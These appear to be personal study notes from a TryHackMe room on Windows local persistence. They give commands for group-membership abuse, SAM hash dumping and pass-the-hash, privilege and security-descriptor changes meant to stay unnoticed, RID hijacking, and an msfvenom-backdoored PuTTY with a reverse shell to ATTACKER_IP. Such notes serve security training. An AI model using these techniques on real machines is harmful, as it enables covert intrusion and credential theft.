# Windows Persistance 
## Assign Group Memberships
- The direct way to make an unprivileged user gain administrative privileges is to make it part of the Administrators group. We can easily achieve this with the following command:
````
net localgroup administrators jack /add
````
- This will allow you to access the server by using RDP, WinRM or any other remote administration service available.
- Can also use the **Backup Operators** group. Users in this group won't have administrative privileges but will be allowed to **read/write any file or registry key** on the system, ignoring any configured DACL.
````
net localgroup "Backup Operators" jack /add
````
- Since this is an unprivileged account, it **cannot RDP or WinRM** back to the machine unless we **add it to the Remote Desktop Users (RDP) or Remote Management Users (WinRM)** groups. We'll use WinRM.
````
net localgroup "Remote Management Users" jack /add
````
- Check the groups and make sure they are not disabled 
````
whoami /groups
GROUP INFORMATION
-----------------
Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators               Alias            S-1-5-32-551 Group used for deny only
````
- This is due to **User Account Control (UAC)**. One of the features implemented by UAC, `LocalAccountTokenFilterPolicy`, strips any local account of its administrative privileges when logging in remotely. While you can elevate your privileges through UAC from a graphical user session, if you are using WinRM, you are confined to a limited access token with no administrative privileges.
- Disable `LocalAccountTokenFilterPolicy` by changing the following registry key to 1:
````
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
````
## SAM SYSTEM Exfil / Pass The Hash
- We then proceed to make a backup of `SAM` and `SYSTEM` files and download them to our attacker machine:
````
reg save hklm\system system.bak
reg save hklm\sam sam.bak
````
- With those files, we can dump the password hashes for all users using secretsdump.py or other similar tools:
````
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x41325422ca00e6552bb6508215d8b426
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cea1d7e8899f69e89088c4cb4bbdaa3:::
--snip--
````
- And finally, perform Pass-the-Hash to connect to the victim machine with Administrator privileges:
````
evil-winrm -i MACHINE_IP -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
````
## Special Privileges and Security Descriptors
- A similar result to adding a user to the Backup Operators group can be achieved without modifying any group membership. 
- Special groups are only special because the operating system assigns them specific privileges by default. Privileges are simply the capacity to do a task on the system itself.
- Complete list of all privileges:
- https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
- In the case of the Backup Operators group, it has the following two privileges assigned by default:
- `SeBackupPrivilege`: The user can read any file in the system, ignoring any DACL in place.
- `SeRestorePrivilege`: The user can write any file in the system, ignoring any DACL in place.
- We can assign such privileges to any user, independent of their group memberships. To do so, we can use the `secedit` command. First, we will export the current configuration to a temporary file:
````
secedit /export /cfg config.inf
````
- We open the file and add our user to the lines in the configuration regarding the SeBackupPrivilege and SeRestorePrivilege:
- ![765671a0355e2260c44e5a12a10f090e](https://user-images.githubusercontent.com/75596877/180827452-97d0b2b3-cd89-459f-95ee-4d5276a41516.png)
- We finally convert the `.inf` file into a `.sdb` file which is then used to load the configuration back into the system:
````
secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cfg config.inf
````
- You should now have a user with equivalent privileges to any `Backup Operator`. The user still can't log into the system via WinRM, so let's do something about it. 
- Instead of adding the user to the `Remote Management Users` group, we'll change the security descriptor associated with the WinRM service to allow `jack` to connect. 
- Think of a security descriptor as an ACL but applied to other system facilities.
- To open the configuration window for WinRM's security descriptor, you can use the following command in **Powershell (you'll need to use the GUI session for this)**:
````
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
````
- This will open a window where you can add `jack` and assign it full privileges to connect to WinRM:
- ![380c80b98c4d1f8c2149ef72427cfeb0](https://user-images.githubusercontent.com/75596877/180828110-e2645cd4-a708-4e8c-b4bf-186ab3d3749c.png)
- Notice that for this user to work with the given privileges fully, you'd have to change the `LocalAccountTokenFilterPolicy` registry key
- If you check your user's group memberships, it will look like a regular user. Nothing suspicious at all!
````
net user jack
User name                    jack

Local Group Memberships      *Users
Global Group memberships     *None
````
## RID Hijacking
- When a user is created, an identifier called Relative ID (RID) is assigned to them. 
- The `RID` is simply a numeric identifier representing the user across the system. When a user logs on, the `LSASS` process gets its `RID` from the `SAM` registry hive and creates an access token associated with that `RID`. 
- If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.
- In any Windows system, the default Administrator account is assigned the `RID = 500`, and regular users usually have `RID >= 1000`.
````
wmic useraccount get name,sid

Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
--snip--
````
- Now we only have to assign the `RID=500` to `jack`. To do so, we need to access the `SAM` using `Regedit`. The `SAM` is restricted to the `SYSTEM` account only, so even the `Administrator` won't be able to edit it. To run `Regedit` as `SYSTEM`, we will use `psexec`.
- `PsExec64.exe -i -s regedit`
From Regedit, we will go to:
- `HKLM\SAM\SAM\Domains\Account\Users\`
- We need to search for a key with its `RID` in hex `(1010 = 0x3F2)`. Under the corresponding key, there will be a value called `F`, which holds the user's effective `RID` at position `0x30`:
- ![d630140974989748ebcf150ba0696d14](https://user-images.githubusercontent.com/75596877/180829367-5257c90e-37bc-4773-9ae2-d1a9bbb0fdc5.png)
- Notice the RID is stored using little-endian notation, so its bytes appear reversed.
- We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401):
- ![8f2072b6d13b7343cf7b890586703ddf](https://user-images.githubusercontent.com/75596877/180829481-acd6a81c-fb14-480b-92c8-aa41539dc9f3.png)
- The next time `jack` logs in, `LSASS` will associate it with the same `RID` as Administrator and grant them the same privileges.
## Executable Files
- If you find any executable laying around the desktop, the chances are high that the user might use it frequently. 
- Suppose we find a shortcut to `PuTTY` lying around. If we checked the shortcut's properties, we could see that it (usually) points to `C:\Program Files\PuTTY\putty.exe`. From that point, we could download the executable to our attacker's machine and modify it to run any payload we wanted.
````
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
````
## Shortcut Files













### Credit: 
All credit to the content of this page goes to the origional author
- https://tryhackme.com/room/windowslocalpersistence
- https://tryhackme.com/p/munra
- https://tryhackme.com/p/tryhackme




